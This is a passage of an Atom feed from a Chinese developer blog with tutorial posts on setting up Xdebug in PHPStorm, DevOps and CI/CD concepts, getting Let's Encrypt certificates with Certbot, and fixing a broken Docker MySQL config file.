<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boo</title>
  
  
  <link href="https://www.0x2beace.com/atom.xml" rel="self"/>
  
  <link href="https://www.0x2beace.com/"/>
  <updated>2020-09-15T13:21:21.882Z</updated>
  <id>https://www.0x2beace.com/</id>
  
  <author>
    <name>Boo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows、Mac 下使用 PHPStorm 配置 Xdebug，实现断点调试</title>
    <link href="https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/"/>
    <id>https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/</id>
    <published>2020-09-15T13:15:36.000Z</published>
    <updated>2020-09-15T13:21:21.882Z</updated>
    
    <content type="html"><![CDATA[<p>搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。<br>所以便有了这篇关于<code>PHPSTORM</code>调试的笔记。</p><a id="more"></a><p>在进行调试之前，首先要做的是下载并安装<code>Xdebug</code>，然后才能做相应的配置。</p><h2 id="下载Xdebug（Windows）"><a href="#下载Xdebug（Windows）" class="headerlink" title="下载Xdebug（Windows）"></a>下载Xdebug（Windows）</h2><ul><li><a href="https://xdebug.org/download.php" target="_blank" rel="noopener">xdebug官网</a></li></ul><blockquote><p>如何选择符合自己PHP的版本的Xdebug，可以通过下面这种方法来判断。</p></blockquote><p>使用Xdubug官方提供的一个<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">检测工具</a></p><p>在命令行中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Mac</span><br><span class="line">$ php -i | pbcopy</span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">$ php -i | xsel </span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">$ php -i | clip</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200915211657.png" alt=""></p><p>将输出的<code>phpinfo</code>信息填入，然后就会自动检测该版本的PHP 所对应的Xdebug，如下图（这里以Windows 为例）：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200915211717.png" alt=""></p><p>点击下载相应的文件。</p><h2 id="安装并配置Xdebug"><a href="#安装并配置Xdebug" class="headerlink" title="安装并配置Xdebug"></a>安装并配置Xdebug</h2><ol><li>将下载好的文件放进指定目录 <code>..\php\ext\</code></li><li>配置<code>php.ini</code>文件，这里需要注意的是：要找到正确的<code>php.ini</code>文件。如果你不确定是哪一个，可以参考下面这个方法：</li></ol><p>打印出<code>phpinfo()</code>，找到字段<code>Loaded Configuration File</code>根据后面的路径去找就没错了。</p><p>打开找到的php.ini配置文件，在最后面加上以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line">[XDebug]</span><br><span class="line">zend_extension &#x3D; &quot;C:\xampp\php\ext\php_xdebug-2.6.1-7.2-vc15.dll&quot;  #这个地址指向 xdebug所在的文件路径</span><br><span class="line">xdebug.profiler_enable &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port&#x3D;9001</span><br><span class="line">xdebug.idekey&#x3D;PHPSTROM</span><br><span class="line">xdebug.remote_host &#x3D; localhost</span><br></pre></td></tr></table></figure><p>其中：</p><ol><li><code>xdebug.remote.host</code>如果是本地调试，填<code>localhost</code>就好。</li><li><code>xdebug.remote_port</code>为调试所监听的端口，通常默认使用 <code>9001</code> ，需要和PHPStorm 中的 Debug port 相同。</li></ol><h2 id="下载并安装Xdebug（Mac）"><a href="#下载并安装Xdebug（Mac）" class="headerlink" title="下载并安装Xdebug（Mac）"></a>下载并安装Xdebug（Mac）</h2><p>Mac 下安装Xdebug，有两种方式：</p><ol><li>使用<code>pecl</code>命令</li><li>通过源码编译</li></ol><h3 id="使用-pecl"><a href="#使用-pecl" class="headerlink" title="使用 pecl"></a>使用 pecl</h3><blockquote><p>Pecl 是 PHP 的包管理器。</p></blockquote><p>这里以<code>PHP5.6</code>为例，需要安装最新<code>2.5.x</code>版本的Xdebug，因为这是<code>PHP5.6</code>提供支持的最后一个版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pecl install xdebug-2.5.5</span><br></pre></td></tr></table></figure><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>源码获取的方式和上面Windows 的方式是一样的，将输出的<code>phpinfo</code>粘贴至输入框，然后下载对应版本的Xdebug。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xvzf xdebug-2.9.4.tgz</span><br><span class="line">$ cd xdebug-2.9.4.tgz</span><br><span class="line">$ phpize</span><br><span class="line">$ .&#x2F;configure</span><br><span class="line">$ make</span><br><span class="line">$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug</span><br></pre></td></tr></table></figure><h4 id="启用Xdebug"><a href="#启用Xdebug" class="headerlink" title="启用Xdebug"></a>启用Xdebug</h4><p>无论是通过哪种方式安装，在正式使用之前，都需要手动启用该模块。</p><p>找到对应版本的 php.ini 文件并编辑，在配置文件中的最后部分加上以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;</span><br><span class="line">xdebug.profiler_enable &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port&#x3D;9001</span><br><span class="line">xdebug.idekey&#x3D;PHPSTORM</span><br><span class="line">xdebug.remote_host &#x3D; localhost</span><br></pre></td></tr></table></figure><p>重启PHP即可。</p><blockquote><p>如何检查Xdebug 是否启用？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php -m | grep xdebug</span><br><span class="line">xdebug</span><br></pre></td></tr></table></figure><h3 id="在PHPStorm中配置Xdebug"><a href="#在PHPStorm中配置Xdebug" class="headerlink" title="在PHPStorm中配置Xdebug"></a>在PHPStorm中配置Xdebug</h3><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><ol><li><code>File-&gt;Setting-&gt;PHP-&gt;Debug</code>，确保<code>PHPStorm</code> 已经找到了<code>Xdebug</code>。</li></ol><p>在刚才的配置没错的前提下，这里是可以看到已经成功安装了<code>Xdebug</code>的。</p><p><img src="https://i.loli.net/2020/03/24/yw6EbgcujoFILXU.png" alt="image.png"></p><p>如果显示没有安装，请检查上面两步操作有无问题。</p><ol start="2"><li><code>File-&gt;Setting-&gt;PHP-&gt;Debug</code></li></ol><p><img src="https://i.loli.net/2020/03/24/iKkmq3AsIy2UOWX.jpg" alt="PHPStorm 2.jpg"></p><p>Debug port 与<code>php.ini</code>配置文件中的<code>xdebug.remote_port</code>的对应参数保持一致。</p><ol start="3"><li><code>File-&gt;Setting-&gt;PHP-&gt;Server</code>，这三个参数的值和<code>php.ini</code>中的保持一致。</li></ol><p><img src="https://i.loli.net/2020/03/24/sgzX4G957CuTWPj.jpg" alt="PHPStorm 3.jpg"></p><ol start="4"><li>配置域名</li></ol><p><img src="https://i.loli.net/2020/03/24/kecrgBb1IfWaVYR.jpg" alt="PHPStorm 4.jpg"></p><p>这里根据实际情况配置，我本地使用80 端口作为项目访问端口，所以这里填的是80。</p><ol start="5"><li>配置调试参数</li></ol><p><img src="https://i.loli.net/2020/03/24/pShQCstHl7N32na.jpg" alt="PHPStorm 5.jpg"></p><ol start="6"><li><code>Run-&gt;Web Server Debug Validation</code>，检查是否配置成功。</li></ol><p><img src="https://i.loli.net/2020/03/24/Plxvs6gKOcqIGV1.jpg" alt="PHPStorm 6.jpg"></p><p>确保项目文件路径和本地域名能正常访问，如果一切正常则能看到输出。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>Windows 下的PHPStorm 配置和Mac 几乎差不多，保证一下几点是正常的基本上没啥问题。</p><ol><li>确保PHPStorm 启用了对应版本的 Xdebug。</li><li>PHPStorm 的调试信息与<code>php.ini</code>文件中保持一致。</li><li>项目文件路径和本地域名能正常访问。</li></ol><blockquote><p>Xdebug 调试端口并非一定要用9001，只要保持<code>php.ini</code>与<code>PHPStorm</code> 的保持一致就好了。</p></blockquote><h4 id="在PHPStorm中使用Xdebug"><a href="#在PHPStorm中使用Xdebug" class="headerlink" title="在PHPStorm中使用Xdebug"></a>在PHPStorm中使用Xdebug</h4><p>有两种方式使用Xdebug：</p><ol><li>直接在编辑器中开始调试。</li><li>通过在请求地址中附加xdebug 的请求参数来调试，这招通常用来处理一些前后端分离的联动调试。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://laravel-china.org/articles/16770/the-first-chapter-of-laravel-phpstrom-xdebug-configuration-and-use" target="_blank" rel="noopener">PhpStrom Xdebug 配置与使用</a></li><li><a href="https://getgrav.org/blog/macos-mojave-apache-mysql-vhost-apc" target="_blank" rel="noopener">如何在Mac 上为不同版本的PHP 开启Xdebug</a></li><li><a href="https://www.jetbrains.com/help/phpstorm/configuring-xdebug.html" target="_blank" rel="noopener">配置Xdebug-官方教程</a></li><li><a href="https://xdebug.org/" target="_blank" rel="noopener">Xdebug 官网</a></li><li><a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">Xdebug 检测工具</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。&lt;br&gt;所以便有了这篇关于&lt;code&gt;PHPSTORM&lt;/code&gt;调试的笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Xdebug" scheme="https://www.0x2beace.com/tags/Xdebug/"/>
    
  </entry>
  
  <entry>
    <title>什么是DevOps、CI、CD、K8S</title>
    <link href="https://www.0x2beace.com/what-is-devops-ci-cd-k8s/"/>
    <id>https://www.0x2beace.com/what-is-devops-ci-cd-k8s/</id>
    <published>2020-09-12T14:40:00.000Z</published>
    <updated>2020-09-14T01:44:10.169Z</updated>
    
    <content type="html"><![CDATA[<p>之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。</p><p>gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094145.png" alt=""></p><p>只是了解到一个叫做 <code>CI/CD</code>的东西。后来又延伸扩展到<code>DevOps</code>、<code>K8S</code> 这些新概念。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094211.png" alt=""></p><h2 id="什么是-DevOps？"><a href="#什么是-DevOps？" class="headerlink" title="什么是 DevOps？"></a>什么是 DevOps？</h2><p>如题，什么是 DevOps ？根据字面意思理解就是：<code>Dev</code> + <code>Ops</code>，开发（Development）和运营（Operations）这两个领域的合并。</p><p>就我个人的理解，它是一个概念、一种思维，是一种通力合作，共同解决问题的方式。</p><p>这里我就不追根溯源去解释为什么要合并开发和运营了，因为历史原因，总是存在着这样的问题。具体看参考链接一。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094228.png" alt=""></p><p>DevOps 也不仅仅是一种软件的部署方法。它通过一种全新的方式，来思考如何让软件的作者（开发部门）和运营者（运营部门）进行合作与协同。使用了DevOps模型之后，会使两个部门更好的交互。<br>其中，<code>自动化部署</code>的概念就是从中产生的。</p><h2 id="什么是-CI-CD？"><a href="#什么是-CI-CD？" class="headerlink" title="什么是 CI/CD？"></a>什么是 CI/CD？</h2><p>Gitlab 的<code>CI/CD</code>到底是什么呢？</p><p>昨天大致了解了下 <code>Gitlab CI/CD</code>，不是很明白，但觉得很厉害。<br>首先来看下官方文档的简介：</p><blockquote><p>软件开发的连续方法基于自动执行脚本，以最大限度地减少在开发应用程序时引入错误的可能性。从新代码的开发到部署，它们需要较少的人为干预甚至根本不需要干预。<br>它涉及在每次小迭代中不断构建，测试和部署代码更改，从而减少基于有缺陷或失败的先前版本开发新代码的机会。</p></blockquote><p>这里有三种主要的方法，根据最适合你的策略进行选择。</p><h3 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h3><p>考虑一个应用程序，其代码存储在Gitlab中的存储库中。开发人员每天多次推送代码更改，对于每次推动到存储库，都可以创建一组脚本来自动构建和测试应用程序，从而减少向应用程序引入错误的可能性。这种方法被称为：<strong>持续集成（Continuous Integration）</strong></p><h3 id="持续交付"><a href="#持续交付" class="headerlink" title="持续交付"></a>持续交付</h3><p><strong>持续交付 Continuous Delivery</strong>是持续集成的一个步骤，应用程序不仅在推送到代码库的每个代码更改时都构建和测试，而且作为一个额外的步骤，它也会连续部署，尽管部署是手动触发的。</p><h3 id="持续部署"><a href="#持续部署" class="headerlink" title="持续部署"></a>持续部署</h3><p><strong>持续部署 Continuous Deployment</strong>也是持续集成的又一步，类似于持续交付。不同之处在于，不必手动部署应用程序，而是将其设置为自动部署。完全不需要人工干预就可以部署应用程序。</p><h2 id="什么是-K8S？"><a href="#什么是-K8S？" class="headerlink" title="什么是 K8S？"></a>什么是 K8S？</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/bjweimengshu/article/details/79031552" target="_blank" rel="noopener">什么是DevOps？–程序员小灰</a></li><li><a href="https://www.cnblogs.com/servicehot/p/6510199.html" target="_blank" rel="noopener">DevOps 到底是什么？</a></li><li><a href="https://docs.gitlab.com/ee/ci/introduction/index.html" target="_blank" rel="noopener">使用GitLab介绍CI / CD</a></li><li><a href="http://www.ttlsa.com/auto/gitlab-cicd-quick-start/" target="_blank" rel="noopener">Gitlab CI/CD 快速入门</a></li><li><a href="https://docs.gitlab.com/ee/ci/quick_start/README.html" target="_blank" rel="noopener">Gitlab CI/CD 入门</a></li><li><a href="https://docs.gitlab.com/ee/ci/README.html" target="_blank" rel="noopener">Gitlab CI 示例</a></li><li><a href="https://docs.gitlab.com/ee/ci/docker/README.html" target="_blank" rel="noopener">Docker 集成</a></li><li><a href="https://docs.gitlab.com/runner/" target="_blank" rel="noopener">Git Runner 是什么？</a></li><li><a href="https://docs.gitlab.com/runner/install/" target="_blank" rel="noopener">安装Gitlab Runner</a></li><li><a href="https://docs.gitlab.com/ee/topics/autodevops/index.html" target="_blank" rel="noopener">什么是 Auto DevOps</a></li><li><a href="https://zhuanlan.zhihu.com/p/29232090" target="_blank" rel="noopener">K8S 是什么？知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/33640916" target="_blank" rel="noopener">为什么 K8S 很酷</a></li><li><a href="https://github.com/rootsongjc/kubernetes-handbook" target="_blank" rel="noopener">K8S 中文指南</a></li><li><a href="https://zhuanlan.zhihu.com/p/28810342" target="_blank" rel="noopener">一文了解 K8S 是什么？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。&lt;/p&gt;
&lt;p&gt;gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    
    <category term="DevOps" scheme="https://www.0x2beace.com/tags/DevOps/"/>
    
    <category term="K8S" scheme="https://www.0x2beace.com/tags/K8S/"/>
    
  </entry>
  
  <entry>
    <title>如何自动申请免费的SSL 证书</title>
    <link href="https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/"/>
    <id>https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/</id>
    <published>2020-09-11T08:18:20.000Z</published>
    <updated>2020-09-11T08:20:18.056Z</updated>
    
    <content type="html"><![CDATA[<p>上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。</p><a id="more"></a><p><a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s Encrypt</a> 是一个免费提供的SSL 证书的CA，虽然每次签发的有效期都只有三个月，但是发证是自动化的，发证速度较快，并且可以通过脚本来自动续签，为个人网站使用HTTPS提供了一个不错的选择。</p><p>Let’s Encrypt （以下简称LE）的证书签发主要使用基于 ACME协议 的证书自动管理客户端来实现。</p><p>LE官方推荐的客户端是 <a href="https://certbot.eff.org/" target="_blank" rel="noopener">Certbot</a> ，本文中就是使用 Certbot 来获取和续签证书。</p><h2 id="LE-是如何自动签发证书的"><a href="#LE-是如何自动签发证书的" class="headerlink" title="LE 是如何自动签发证书的"></a>LE 是如何自动签发证书的</h2><p>假设现在要申请CA 证书的域名是 <code>example.com</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120519.png" alt=""></p><p>首先由WebServer（也就是我们用户端的服务器）的管理客户端（如Certbot）发送请求到LE，让LE来验证客户端是否真的控制example.com这个域名，接下来LE会提出一些验证动作（原文challenges），比如让客户端在一个很明显的路径上放指定的文件。同时，LE还会发出一个随机数，客户端需要用这个随机数和客户端自己的私钥来进行签名。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120904.png" alt=""></p><p>WebServer上的客户端完成LE指定的域名验证动作并且将加密后的签名后，再次发送请求到LE要求验证，LE会验证发回来的签名是否正确，并且验证域名验证动作是否完成，如下载指定的文件并且判断文件里面的内容是否符合要求。</p><p>这些验证都完成以后，可以申请证书了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120943.png" alt=""></p><p>完成验证后，客户端生成自己的私钥以及 <a href="https://tools.ietf.org/html/rfc2986" target="_blank" rel="noopener">Certificate Signing Request（CSR）</a> 发送到LE服务器，LE服务器会将CA证书（也是公钥）发放到你的服务器。</p><p>这样就完成了CA证书的自动化发放了。</p><h3 id="使用Certbot-获取证书"><a href="#使用Certbot-获取证书" class="headerlink" title="使用Certbot 获取证书"></a>使用Certbot 获取证书</h3><p>LE 的CA 证书发放原理看着还挺麻烦的，但如果使用 Certbot 客户端，整个过程还是挺简单的。</p><p>在正式获取证书之前，推荐先去<a href="https://certbot.eff.org/instructions" target="_blank" rel="noopener">Certbot 官网</a>选择适合自己的系统环境。</p><p>我这边系统环境是<code>Nginx</code> + <code>Ubuntu 18.04 LTS</code>，所以下面介绍的安装流程只适用于<strong>Ubuntu + Nginx</strong>。</p><h4 id="1-安装-snap"><a href="#1-安装-snap" class="headerlink" title="1. 安装 snap"></a>1. 安装 snap</h4><p><a href="https://zh.wikipedia.org/zh-hans/Snappy_(%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8)" target="_blank" rel="noopener">snap</a> 是Canonical公司发布的全新的软件包管理方式，它类似一个容器拥有一个应用程序所有的文件和库，各个应用程序之间完全独立。使用snap 包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理。但是由此带来的问题就是它占用更多的磁盘空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install snapd</span><br></pre></td></tr></table></figure><h4 id="2-安装-certbot"><a href="#2-安装-certbot" class="headerlink" title="2. 安装 certbot"></a>2. 安装 certbot</h4><p>在安装 Certbot 之前，最好先移除历史快照。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get remove certbot</span><br></pre></td></tr></table></figure><p>进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo snap install --classic certbot</span><br></pre></td></tr></table></figure><h4 id="3-生成证书"><a href="#3-生成证书" class="headerlink" title="3. 生成证书"></a>3. 生成证书</h4><p>安装完成之后，下一步需要做的就是生成证书了，这里有两种方式：</p><ol><li><p>生成证书并自动配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot --nginx</span><br></pre></td></tr></table></figure></li><li><p>生成证书手动配置</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot certonly --nginx</span><br></pre></td></tr></table></figure><p>我选择的是手动配置，大概流程如下：</p><ol><li>输入常用邮箱，用来接收通知和恢复密钥。</li><li>同意使用协议。</li><li>输入需要做授权的域名，多个域名用空格隔开。</li><li>等待验证通过。</li></ol><p>如果其中某个域名验证失败，则不会生成密码。</p><p>一切正常的话，可以看到<code>/etc/letsencrypt/live/your_sites/</code>目录下多了四个文件：</p><ul><li><code>cert.pem</code> ： 公钥，服务器证书</li><li><code>chain.pem</code> ： 中间证书</li><li><code>fullchain.pem</code> ： 前两个的合集</li><li><code>privkey.pem</code> ： 私钥</li></ul><p>其中配置Nginx SSL 只需要用到<code>fullchain.pem</code> 和<code>privkey.pem</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    server_name www.example.com;</span><br><span class="line"></span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，就已经完成了生成证书到配置的全部过程了。</p><h3 id="自动续签"><a href="#自动续签" class="headerlink" title="自动续签"></a>自动续签</h3><p>如果快要到期了，可以使用<code>certbot renew</code>对证书进行更新，需要注意的是，如果证书尚未过期，则不会更新。</p><p>可以配合<code>conrtab</code>使用，每半个月的凌晨三点自动续签一次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 0 3 15 * * certbot renew</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.cngal.org/index.php?controller=post&action=view&id_post=10" target="_blank" rel="noopener">Let’s Encrypt免费SSL证书获取以及自动续签</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="HTTPS" scheme="https://www.0x2beace.com/tags/HTTPS/"/>
    
    <category term="SSL" scheme="https://www.0x2beace.com/tags/SSL/"/>
    
    <category term="Certbot" scheme="https://www.0x2beace.com/tags/Certbot/"/>
    
  </entry>
  
  <entry>
    <title>当 Docker 容器无法正常启动时如何修改配置文件</title>
    <link href="https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/"/>
    <id>https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/</id>
    <published>2020-09-10T13:12:13.000Z</published>
    <updated>2020-09-10T13:13:32.922Z</updated>
    
    <content type="html"><![CDATA[<p>在容器无法正常启动的情况下，如何修改其配置文件？</p><p>问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？</p><a id="more"></a><p>这种情况下，有两种方式去修改：<br>2. Docker 容器的配置文件一般在 <code>/var/lib/docker/overlay/</code>目录下，可以找到该目录下对应的配置文件进行修改。<br>2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。</p><h2 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h2><ol><li><p>查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名称&#x2F;容器id&gt;</span><br><span class="line"></span><br><span class="line">ERROR: mysqld failed while attempting to check config</span><br><span class="line">command was: &quot;mysqld --verbose --help&quot;</span><br><span class="line">2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;</span><br><span class="line">2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure><p>由于异常日志可以得知是因为我将<code>relay-log</code> 写成了 <code>realy</code> 导致容器无法正常启动。</p></li><li><p>查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name mysqld.cnf</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。</p></li><li><p>修改配置文件</p></li><li><p>重启容器即可。</p></li></ol><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>如果第一种方式没生效，那可以尝试第二种方式。</p><ol><li><p>复制容器中的配置文件到主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>修改主机中的配置文件</p></li><li><p>将该配置文件mv 到容器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>重启配置文件即可。</p></li></ol><p>总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/LinHenk/article/details/88111616" target="_blank" rel="noopener">Docker修改无法启动的容器的配置文件</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在容器无法正常启动的情况下，如何修改其配置文件？&lt;/p&gt;
